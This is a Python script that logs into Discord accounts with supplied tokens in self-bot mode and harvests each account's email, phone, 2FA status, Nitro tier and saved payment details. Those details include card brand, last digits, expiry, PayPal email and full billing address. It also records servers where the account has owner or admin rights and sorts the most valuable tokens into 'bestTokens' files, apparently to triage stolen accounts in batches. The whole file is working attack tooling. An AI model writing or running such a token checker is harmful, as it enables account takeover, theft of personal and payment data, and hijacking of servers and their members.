# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
import json
from colorama import Fore, init
import sys
import os
import requests
intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="218fkj", self_bot=True, intents=intents)
init(autoreset=True)
red = Fore.LIGHTRED_EX
blue = Fore.CYAN
green = Fore.LIGHTGREEN_EX
yellow = Fore.YELLOW
dgreen = Fore.GREEN
white = Fore.RESET
cwd = os.getcwd()
token = None
folder = None
dms = None
threshold = None
def an(content):
    sys.stdout.write(f"{content}\r")
def runToken(token2, folder2, dm2, threshold2):
    global token
    global folder
    global dms
    global threshold
    token = token2
    folder = folder2
    dms = dm2
    threshold = int(threshold2)
    try:
        bot.run(token2, bot=False)
    except Exception as e:
        print(e)
        pass
@bot.event
async def on_connect():
    global token
    global folder
    alldata = {}
    os.makedirs(f"{folder}\\tokenData\\{bot.user.id}")
    open(f"{folder}\\tokenData\\{bot.user.id}\\personal.txt", "x")
    open(f"{folder}\\tokenData\\{bot.user.id}\\guilds.txt", "x")
    open(f"{folder}\\tokenData\\{bot.user.id}\\payment.txt", "x")
    open(f"{folder}\\tokenData\\{bot.user.id}\\all_data.txt", "x")
    f = open(f"{folder}\\tokenData\\{bot.user.id}\\token.txt", "x")
    f.writelines(token)
    f.close()
    all_data2 = open(f"{folder}\\all_data.txt", "a", encoding="utf-8")
    all_data = open(f"{folder}\\tokenData\\{bot.user.id}\\all_data.txt", "a", encoding="utf-8")
    headers = { 
        "Content-Type": "application/json", 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Authorization": token
    }
    req = requests.get("https://discord.com/api/users/@me", headers=headers)
    tokenData = req.json()
    try:
        if tokenData["premium_type"] == 1:
            sniff_nitro = "Classic ($5)"
        elif tokenData["premium_type"] == 2:
            sniff_nitro = "Nitro ($10)"
        else:
            sniff_nitro = "None"
    except:
        sniff_nitro = "None"
    personaldata = f"""-=-=-= {tokenData["username"]}#{tokenData["discriminator"]} =-=-=-
ID: {tokenData["id"]}
Name: {tokenData["username"]}#{tokenData["discriminator"]}
Avatar: https://cdn.discordapp.com/avatars/{tokenData["id"]}/{tokenData["avatar"]}
Nitro: {sniff_nitro}
2FA: {tokenData["mfa_enabled"]}
Email: {tokenData["email"]} (verified: {tokenData["verified"]})
Phone: {tokenData["phone"]}
Locale: {tokenData["locale"]}
NSFW: {tokenData["nsfw_allowed"]}
Token: {token}
-=-=-=-=--=-
 """
    with open(f"{folder}\\tokenData\\{bot.user.id}\\personal.txt", "w", encoding="utf-8") as f:
        f.writelines(personaldata)
    all_data.writelines(personaldata)
    if sniff_nitro != "None":
        with open(f"{folder}\\bestTokens\\nitro.txt", "a", encoding="utf-8") as f:
            f.writelines(f"{token} // {bot.user.name}#{bot.user.discriminator} // ID: {bot.user.id} // Nitro: {sniff_nitro}\n")
    req = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
    if req.status_code == 200:
        if req.text != "[]":
            paymentData = req.json()
            data2write = "\n-=-= Payment Data =-=-\n"
            for payment in paymentData:
                if payment["type"] == 1:
                    data2write = data2write + f"""-=-=-=-=--=-
Type: Credit/Debit Card
Invalid: {payment["invalid"]}
ID: {payment["id"]}
Default: {payment["default"]}
Brand: {payment["brand"]}
Last 4 Digits: {payment["last_4"]}
Expire Date: {payment['expires_month']}/{payment['expires_year']}
Country: {payment["country"]}
Billing Address:
- Name: {payment['billing_address']['name']}
- Line1: {payment['billing_address']['line_1']}
- Line2: {payment['billing_address']['line_2']}
- City/Town: {payment['billing_address']['city']}
- State/County: {payment['billing_address']['state']}
- Country: {payment['billing_address']['country']}
- Postal Code: {payment['billing_address']['postal_code']}
-=-=-=-=--=-\n\n"""
                    if payment["invalid"] == True:
                        data = f"{token} // {bot.user.id} // Invalid Card"
                    else:
                        data = f"{token} // {bot.user.id} // Valid Card"
                    with open(f"{folder}\\bestTokens\\billing.txt", "a", encoding="utf-8") as f:
                        f.writelines(data + "\n")
                elif payment["type"] == 2:
                    data2write = data2write + f"""-=-=-=-=--=-
Type: PayPal
Invalid: {payment["invalid"]}
ID: {payment["id"]}
Email: {payment["email"]}
Default: {payment["default"]}
Country: {payment["country"]}
Billing Address:
- Name: {payment['billing_address']['name']}
- Line1: {payment['billing_address']['line_1']}
- Line2: {payment['billing_address']['line_2']}
- City/Town: {payment['billing_address']['city']}
- State/County: {payment['billing_address']['state']}
- Country: {payment['billing_address']['country']}
- Postal Code: {payment['billing_address']['postal_code']}
-=-=-=-=--=-\n\n"""
                    with open(f"{folder}\\bestTokens\\billing.txt", "a", encoding="utf-8") as f:
                        data = f"{token} // {bot.user.id} // Paypal"
                        f.writelines(data + "\n")
            
            with open(f"{folder}\\tokenData\\{bot.user.id}\\payment.txt", "a", encoding="utf-8") as f:
                f.writelines(data2write + "\n")
            all_data.writelines(data2write + "\n")
        else:
            data2write = "\n-=-=-\nNo Payment Data\n-=-=-\n"
            all_data.writelines(data2write)
    else:
        pass
    f = open(f"{folder}\\tokenData\\{bot.user.id}\\guilds.txt", "w", encoding="utf-8")
    f2 = open(f"{folder}\\bestTokens\\guilds.txt", "a", encoding="utf-8")
    data2write = "\n-=-= Guild Data =-=-\n"
    for guild in bot.guilds:
        if guild.me != None:
            if guild.owner_id == bot.user.id:
                f.writelines(f"{guild.name} // {guild.member_count} members // OWNER // {guild.id} guild-id // 2FA: {tokenData['mfa_enabled']}\n")
                data2write += f"{guild.name} // {guild.member_count} members // OWNER // {guild.id} guild-id // 2FA: {tokenData['mfa_enabled']}\n"
                if guild.member_count > threshold:
                    f2.writelines(f"{token} // {bot.user.id} user-id // {guild.name} // {guild.member_count} members // OWNER // {guild.id} guild-id // 2FA: {tokenData['mfa_enabled']}\n")
            elif guild.me.guild_permissions.administrator == True:
                f.writelines(f"{guild.name} // {guild.member_count} members // Administrator // {guild.id} guild-id // 2FA: {tokenData['mfa_enabled']}\n")
                data2write += f"{guild.name} // {guild.member_count} members // Administrator // {guild.id} guild-id // 2FA: {tokenData['mfa_enabled']}\n"
                if guild.member_count > threshold:
                    f2.writelines(f"{token} // {bot.user.id} user-id // {guild.name} // {guild.member_count} members // Administrator // {guild.id} guild-id // 2FA: {tokenData['mfa_enabled']}\n")
            else:
                user_permissions = []
                if guild.me.guild_permissions.manage_guild == True:
                    user_permissions.append("Manage Guild")
                if guild.me.guild_permissions.manage_roles == True:
                    user_permissions.append("Manage Roles")
                if guild.me.guild_permissions.ban_members == True:
                    user_permissions.append("Ban Members")
                if guild.me.guild_permissions.kick_members == True:
                    user_permissions.append("Kick Members")
                if guild.me.guild_permissions.manage_channels == True:
                    user_permissions.append("Manage Channels")
                if len(user_permissions) > 0:
                    f.writelines(f"{guild.name} // {guild.member_count} members // {user_permissions} // {guild.id} guild-id // 2FA: {tokenData['mfa_enabled']}\n")
                    data2write += f"{guild.name} // {guild.member_count} members // {user_permissions} // {guild.id} guild-id // 2FA: {tokenData['mfa_enabled']}\n"
                    if guild.member_count > threshold:
                        f2.writelines(f"{token} // {bot.user.id} user-id // {guild.name} // {guild.member_count} members // {user_permissions} // {guild.id} guild-id // 2FA: {tokenData['mfa_enabled']}\n")
    all_data.writelines(data2write)
    f.close()
    f2.close()
    all_data = open(f"{folder}\\tokenData\\{bot.user.id}\\all_data.txt", "r", encoding="utf-8")
    all_data2.write(f"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n")
    for line in all_data.readlines():
        all_data2.write(f"{line}")
    all_data2.write(f"\n\n")
    all_data2.close()
    all_data.close()
    sys.exit("Loading next token")
runToken(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
